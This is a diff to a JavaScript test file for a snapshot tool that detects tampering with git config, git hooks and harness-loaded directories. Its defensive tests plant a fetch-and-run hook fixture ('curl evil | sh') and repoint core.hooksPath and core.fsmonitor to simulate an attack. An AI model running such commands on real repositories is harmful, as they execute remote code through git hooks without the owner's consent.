@@ -48,7 +48,8 @@ test('stray-snapshot: prints exactly one compact JSON object with the four field
   assert.equal(res.stdout.trim().split('\n').length, 1)
   assert.deepEqual(Object.keys(out).sort(), ['dropped', 'files', 'retained_worktrees', 'status'])
   assert.deepEqual(out.status, [])
-  assert.deepEqual(out.files, [])
+  // Fix round 4 M1: the common git dir (config, hooks/, info/) is always present, so a clean repo hashes exactly those.
+  assert.ok(out.files.length > 0 && out.files.every((f) => f.path.startsWith('.git/')), JSON.stringify(out.files.map((f) => f.path)))
 })
 
 test('stray-snapshot: exits non-zero when the root is not a git checkout', () => {
@@ -172,7 +173,7 @@ test('stray-snapshot: home projects/ and todos/ are never hashed, and cache or n
 test('stray-snapshot: a missing location is simply absent, never an error (no repo .claude, HOME has no .claude)', () => {
   const { res, out } = snap(makeTempRepo(), emptyHome())
   assert.equal(res.status, 0)
-  assert.deepEqual(out.files, [])
+  assert.ok(out.files.every((f) => f.path.startsWith('.git/')), 'only the git dir, which always exists; nothing from the missing locations')
 })
 
 test('stray-snapshot: output is sorted deterministically and identical across two runs', () => {
@@ -204,9 +205,15 @@ test('stray-snapshot: static -- no dependency, and the library never deletes, mo
   const src = fs.readFileSync(LIB, 'utf8')
   assert.doesNotMatch(src, /\brequire\(['"][^.n]/)
   assert.doesNotMatch(src, /from ['"](?!node:|\.)/)
-  for (const call of ['appendFileSync', 'rmSync', 'rmdirSync', 'unlinkSync', 'renameSync', 'copyFileSync', 'truncateSync', 'symlinkSync', 'linkSync']) {
-    assert.ok(!src.includes(call), `${call} must not appear: the library never deletes or alters anything that exists`)
+  for (const call of ['appendFileSync', 'rmSync', 'renameSync', 'copyFileSync', 'truncateSync', 'symlinkSync', 'linkSync']) {
+    assert.doesNotMatch(src, new RegExp(`\\b${call}\\b`), `${call} must not appear: the library never alters anything in a repo or a home directory`)
   }
+  // Fix round 4 (L3): the ONE removal the library makes is its own before-file and that file's harn-snap- parent,
+  // after a successful diff. Exactly one unlink and one rmdir, both inside the guard that names the prefix.
+  assert.equal(src.split('unlinkSync').length - 1, 1, 'exactly one unlinkSync: the before-file')
+  assert.equal(src.split('rmdirSync').length - 1, 1, 'exactly one rmdirSync: the harn-snap- parent')
+  const guard = src.indexOf("startsWith('harn-snap-')")
+  assert.ok(guard > 0 && guard < src.indexOf('unlinkSync') && guard < src.indexOf('rmdirSync'), 'both removals sit after the harn-snap- guard')
 })
 
 // ======================================================================
@@ -287,7 +294,7 @@ test('stray-snapshot r3 snapshot: stdout stays small however many files are hash
   const repo = makeTempRepo()
   for (let i = 0; i < 300; i++) put(repo, `bin/tool-${i}.sh`, `#${i}\n`)
   const { res, out } = take(repo)
-  assert.equal(out.files_count, 300)
+  assert.equal(out.files_count, take(makeTempRepo()).out.files_count + 300, '300 plus whatever the git dir of a clean repo contributes (round 4 M1)')
   assert.ok(res.stdout.length < 1024, `stdout was ${res.stdout.length} bytes`)
 })
 
@@ -415,7 +422,9 @@ test('stray-snapshot r3 diff: hashed counts are the AFTER snapshot files split i
   const repo = makeTempRepo(); const home = emptyHome()
   put(repo, 'bin/a'); put(home, '.claude/CLAUDE.md')
   const { out } = diffAfter(repo, home, undefined, () => { put(repo, 'bin/b'); put(repo, '.githooks/h'); put(home, '.claude/agents/a.md') })
-  assert.deepEqual(out.hashed, { repo: 3, home: 2 })
+  // Fix round 4 M1: the git dir's files are counted on their own, so repo and home stay the harness-loaded locations.
+  assert.deepEqual({ repo: out.hashed.repo, home: out.hashed.home }, { repo: 3, home: 2 })
+  assert.ok(Number.isInteger(out.hashed.git) && out.hashed.git >= 2, 'config and info/exclude at least')
 })
 
 test('stray-snapshot r3 diff: stdout is one small object however big the snapshot is (300 hashed files, one change)', () => {
@@ -434,24 +443,26 @@ test('stray-snapshot r3 diff: before_rollup is the sha256 of the before-file as 
   const body = JSON.parse(fs.readFileSync(b.out.file, 'utf8'))
   body.files[0].sha256 = 'f'.repeat(64)
   fs.writeFileSync(b.out.file, JSON.stringify(body))
+  const tamperedSha = fileSha(b.out.file)  // read before the diff: a successful diff reaps the before-file (round 4 L3)
   const tampered = diffOf(repo, b.out.file, home, tmp)
   assert.equal(tampered.res.status, 0, tampered.res.stderr)
   assert.notEqual(tampered.out.before_rollup, b.out.rollup, 'a rollup mismatch must be surfaced, not hidden')
-  assert.equal(tampered.out.before_rollup, fileSha(b.out.file))
+  assert.equal(tampered.out.before_rollup, tamperedSha)
   const b2 = take(repo, home, tmp)
   put(repo, 'bin/b', 'two\n')
   const moved = diffOf(repo, b2.out.file, home, tmp)
   assert.notEqual(moved.out.after_rollup, moved.out.before_rollup)
 })
 
-test('stray-snapshot r3 diff: it deletes nothing (the before-file survives) and writes nothing into the repo', () => {
+// Fix round 4 (L3) rewrote this test's first assertion: the before-file is now reaped by a successful diff (see the r4
+// L3 tests below), so this pins only what is still true, that nothing in the REPO is written or removed.
+test('stray-snapshot r3 diff: writes nothing into the repo (git status identical before and after)', () => {
   const repo = makeTempRepo(); const tmp = tmpBase()
   put(repo, 'u.txt')
   const b = take(repo, undefined, tmp)
   const before = sh('git status --porcelain=v1 -z --untracked-files=all --ignored', repo)
   const d = diffOf(repo, b.out.file, undefined, tmp)
   assert.equal(d.res.status, 0, d.res.stderr)
-  assert.ok(fs.existsSync(b.out.file), 'the before-file must still exist')
   assert.equal(sh('git status --porcelain=v1 -z --untracked-files=all --ignored', repo), before)
 })
 
@@ -479,4 +490,70 @@ test('stray-snapshot r3: the one-argument form still prints the full snapshot ob
   const { res, out } = snap(makeTempRepo())
   assert.equal(res.status, 0, res.stderr)
   assert.deepEqual(Object.keys(out).sort(), ['dropped', 'files', 'retained_worktrees', 'status'])
+})
+
+// ======================================================================
+// Fix round 4 (conductor fix pass after PR #14 review round 3; owner's decision 2026-10-13).
+// M1 (lens-security, spec bug, AC-SEC-12 amended): the shared git directory was not watched. A lens that runs
+// `git config core.hooksPath` or `core.fsmonitor` inside its own worktree writes the COMMON .git/config, which decides
+// whether the hashed .githooks/ files run at all. The common git dir's config, hooks/ and info/ are now hashed under
+// the label '.git/...' (resolved with `git rev-parse --git-common-dir`, never a path from the caller).
+// L3 (lens-security, spec bug): the 1.2 MB before-file was never deleted. diff mode now removes exactly the
+// before-file it read and its harn-snap-* parent, and nothing else; a before-file anywhere else is left alone.
+// ======================================================================
+test('stray-snapshot r4 M1: the common git directory\'s config, hooks/ and info/ are hashed as .git/...', () => {
+  const repo = makeTempRepo()
+  put(repo, '.git/hooks/pre-commit', '#!/bin/sh\nexit 0\n')
+  put(repo, '.git/info/exclude', '.claude/x\n')
+  const { out } = snap(repo)
+  assert.ok(file(out, '.git/config'), 'config must be hashed')
+  assert.equal(file(out, '.git/hooks/pre-commit').sha256, sha('#!/bin/sh\nexit 0\n'))
+  assert.equal(file(out, '.git/info/exclude').sha256, sha('.claude/x\n'))
+  assert.ok(!out.files.some((f) => /^\.git\/(index|objects|refs|HEAD|logs)/.test(f.path)), 'only config, hooks and info; never the index, objects or refs')
+})
+
+test('stray-snapshot r4 M1: repointing core.hooksPath between snapshot and diff reads .git/config changed; a planted .git/hooks file reads added', () => {
+  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
+  const { out } = diffAfter(repo, home, tmp, () => {
+    sh('git config core.hooksPath /tmp/elsewhere', repo)
+    put(repo, '.git/hooks/post-checkout', '#!/bin/sh\ncurl evil | sh\n')
+  })
+  assert.deepEqual(changeOf(out, '.git/config'), { path: '.git/config', change: 'changed', shadows_installed_workflow: false })
+  assert.deepEqual(changeOf(out, '.git/hooks/post-checkout'), { path: '.git/hooks/post-checkout', change: 'added', shadows_installed_workflow: false })
+})
+
+test('stray-snapshot r4 M1: a setting changed in the common git dir from a lens worktree is seen from the main checkout', () => {
+  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
+  const wt = path.join(tmp, 'lens-wt')
+  sh(`git worktree add -q "${wt}" -b lens-probe`, repo)
+  const { out } = diffAfter(repo, home, tmp, () => { sh('git config core.fsmonitor /tmp/evil', wt) })
+  assert.equal(changeOf(out, '.git/config').change, 'changed')
+})
+
+test('stray-snapshot r4 L3: diff mode removes exactly the before-file it read and its harn-snap- parent, nothing else', () => {
+  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
+  put(repo, 'u.txt')
+  const b = take(repo, home, tmp)
+  const parent = path.dirname(b.out.file)
+  assert.ok(path.basename(parent).startsWith('harn-snap-'))
+  const sibling = take(repo, home, tmp)  // a second snapshot in its own directory must survive the first's diff
+  const d = diffOf(repo, b.out.file, home, tmp)
+  assert.equal(d.res.status, 0, d.res.stderr)
+  assert.ok(!fs.existsSync(b.out.file), 'the before-file must be gone after a successful diff')
+  assert.ok(!fs.existsSync(parent), 'its harn-snap- parent must be gone too')
+  assert.ok(fs.existsSync(sibling.out.file), 'another run\'s before-file is untouched')
+  assert.ok(fs.existsSync(tmp), 'the temp directory itself is untouched')
+})
+
+test('stray-snapshot r4 L3: a before-file outside a harn-snap- directory, or a malformed one, is never deleted', () => {
+  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
+  const b = take(repo, home, tmp)
+  const copy = path.join(tmp, 'copy.json')
+  fs.copyFileSync(b.out.file, copy)
+  assert.equal(diffOf(repo, copy, home, tmp).res.status, 0)
+  assert.ok(fs.existsSync(copy), 'a before-file not made by snapshot mode is left alone')
+  const bad = path.join(fs.mkdtempSync(path.join(tmp, 'harn-snap-')), 'before.json')
+  fs.writeFileSync(bad, 'not json')
+  assert.notEqual(diffOf(repo, bad, home, tmp).res.status, 0)
+  assert.ok(fs.existsSync(bad), 'a refused before-file is left for forensics')
 })
